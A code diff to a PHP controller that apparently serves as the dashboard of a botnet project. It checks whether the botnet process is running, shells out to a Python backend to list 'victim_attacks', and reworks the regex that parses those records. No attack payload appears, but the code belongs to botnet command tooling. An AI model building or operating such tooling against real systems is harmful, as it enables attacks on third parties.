@@ -44,7 +44,11 @@ class HomeController extends Controller
         $nombreProcessus = intval($resultat);
 
         // Vérifier si le processus est actif
-        $status_botnet = $nombreProcessus > 2;
+        if ($nombreProcessus > 2) {
+            $status_botnet = true;
+        } else {
+            $status_botnet = false;
+        }
 
         // Exécute la commande --showall --target victim_attacks
         exec('/home/debian/PA-BOTNET-PYSRV/venv/bin/python /home/debian/PA-BOTNET-PYSRV/main.py --showall --target victim_attacks', $output, $return);
@@ -54,14 +58,14 @@ class HomeController extends Controller
 
         // Parser chaque ligne de l'output et construire le tableau des attaques
         foreach ($output as $line) {
-            preg_match("/\((\d+), \d+, '(\w+)', '(\w+)', '(\{.*?\})', datetime\.datetime\((\d{4}), (\d{1,2}), (\d{1,2}), (\d{1,2}), (\d{1,2}), (\d{1,2})\), datetime\.datetime\((\d{4}), (\d{1,2}), (\d{1,2}), (\d{1,2}), (\d{1,2}), (\d{1,2})\)\)/", $line, $matches);
+            preg_match("/\((\d+), \d+, '(\w+)', '(\w+)', '(\{.*\})', .*, '(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})'.*\)/", $line, $matches);
             if ($matches) {
                 $attacks[] = [
                     'id' => $matches[1],
-                    'type' => $matches[3],
-                    'status' => $matches[4],
-                    'args' => $matches[5],
-                    'timestamp' => "{$matches[6]}-{$matches[7]}-{$matches[8]} {$matches[9]}:{$matches[10]}:{$matches[11]}"
+                    'type' => $matches[2],
+                    'status' => $matches[3],
+                    'args' => $matches[4],
+                    'timestamp' => $matches[5]
                 ];
             }
         }
@@ -73,8 +77,7 @@ class HomeController extends Controller
             'userRegistrationCounts' => json_encode($userRegistrationCounts),
             'networkCount' => $networkCount,
             'attacks' => $attacks,
-            'botnet_status' => $status_botnet
-        ]);
+        ])->with('botnet_status', $status_botnet);
     }
 
     public function aide_botnet()
